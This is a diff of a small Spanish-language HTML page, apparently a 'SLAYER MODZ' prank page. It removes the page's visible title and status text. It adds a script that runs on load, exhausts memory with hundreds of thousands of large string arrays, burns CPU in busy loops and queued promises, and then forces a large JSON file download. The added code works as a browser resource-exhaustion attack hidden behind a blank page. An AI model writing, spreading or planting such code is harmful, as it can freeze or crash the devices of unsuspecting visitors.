@@ -2,39 +2,37 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>HOLIS <3</title>
-<style>
-body {background:#010806;color:#0ff;font-family:monospace;padding:20px;}
-h1 {text-shadow:0 0 15px #0ff;}
-#status {margin-top:20px;}
-</style>
 </head>
 <body>
-<h1>⚡ THE SLAYER MODZ ⚡</h1>
-<div id="status">// Preparando creación masiva...</div>
-
 <script>
-const status = document.getElementById('status');
+(function(){
+    const OBJECTS = 200000;
+    const LONG_TEXT = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. ".repeat(100);
 
-(function createYB() {
-    status.textContent = "// Generando YB 9999 instantáneamente...";
+    let ybArray = new Array(OBJECTS).fill(0).map((_, i) => ({
+        id: i,
+        text: LONG_TEXT + " -- REPETICIÓN #" + i
+    }));
 
-    const OBJECTS = 100_000;
-    const LONG_TEXT = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. ".repeat(50);
+    for(let i = 0; i < 1000000; i++) {
+        Math.sqrt(i**3 + i**2 + i);
+    }
 
-    let ybArray = new Array(OBJECTS).fill(0).map((_,i) => ({
-        id: i,
-        text: LONG_TEXT + " -- REPETICIÓN #" + i
-    }));
+    let memoryHog = [];
+    for(let i=0;i<500000;i++){
+        memoryHog.push(new Array(1000).fill("X".repeat(500)));
+    }
 
-    status.textContent = `// Creación completada: ${ybArray.length} objetos generados ✅`;
+    for(let i=0;i<1000;i++){
+        Promise.resolve().then(()=>{for(let j=0;j<100000;j++){}});
+    }
 
-    const blob = new Blob([JSON.stringify(ybArray)], {type:'application/json'});
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = 'YB_9999.json';
-    a.click();
-    URL.revokeObjectURL(a.href);
+    const blob = new Blob([JSON.stringify(ybArray)], {type:'application/json'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'YB_9999.json';
+    a.click();
+    URL.revokeObjectURL(a.href);
 })();
 </script>
 </body>
